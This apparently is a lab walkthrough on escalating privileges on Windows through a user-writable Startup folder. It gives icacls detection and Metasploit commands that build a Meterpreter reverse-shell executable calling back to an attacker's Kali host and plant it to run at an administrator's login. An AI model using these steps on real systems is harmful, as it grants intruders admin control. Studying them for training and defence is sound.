
---
### 🛡️ **Detection (Finding the Vulnerability)**

In the **Windows VM**, run:

```cmd
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- This checks the permissions on the **Startup folder** (used to launch apps automatically when a user logs in).
    
- You see that **BUILTIN\Users** have **full access (F)** — meaning **any standard user** can place executable files there.
    

---

### 💥 **Exploitation (Running Your Code as Admin)**

You abuse this misconfiguration to run **malicious code** on the next admin login.

#### On the **Kali VM**:

1. Start **Metasploit**:
    

```bash
msfconsole
```

2. Set up a reverse shell handler:
    

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Your Kali IP]
run
```

3. Generate the payload:
    

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP] -f exe -o x.exe
```

> This creates an `.exe` that connects back to your machine.

4. Transfer `x.exe` to the Windows machine (via SMB, USB, RDP, etc.).
    

---

#### On the **Windows VM**:

1. Copy `x.exe` to the **Startup folder**:
    

```cmd
move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

2. **Log off**.
    
3. **Log back in as an Administrator** (or wait for the admin to log in).
    

---

#### On the **Kali VM**:

Once the admin logs in, your payload **auto-executes** with their privileges, and you get a **Meterpreter session**.

4. In Meterpreter:
    

```bash
getuid
```

- You'll see something like: `User-PC\Admin`, confirming **privilege escalation**.
    

---

### 🧠 Why This Works

- The Startup folder runs **anything placed in it** on login.
    
- Because **Users** have full write access, you can drop any executable.
    
- When an **admin logs in**, your code **runs with their rights**.
    

---

